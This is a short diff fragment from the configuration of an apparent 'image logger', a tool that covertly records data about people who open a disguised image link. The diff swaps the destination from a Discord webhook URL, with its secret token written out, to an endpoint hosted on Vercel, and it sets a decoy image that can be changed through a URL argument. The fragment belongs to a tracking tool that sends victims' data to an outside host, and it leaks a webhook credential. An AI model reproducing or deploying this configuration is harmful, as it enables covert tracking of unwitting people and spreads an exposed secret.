@@ -12,7 +12,7 @@ __author__ = "Leon"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1370364559537344592/99_9vp2wot9JDc9Kv28e302arJ1SYaHqO3oESY5YiqdXjbek5yUoiYjQyr4BPlewm2G_",
+    "webhook": "https://imagett-leon1232343s-projects.vercel.app/api/Image.py?g=NTEuMDg3NTcxNSwxMS40MTA1NDYz",
     "image": "https://shop.renolit.com/out/pictures/master/product/1/Grau_7155_Glatt-2_Grey_7155_Smooth-2_02.11.71.000047---809700_OS.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
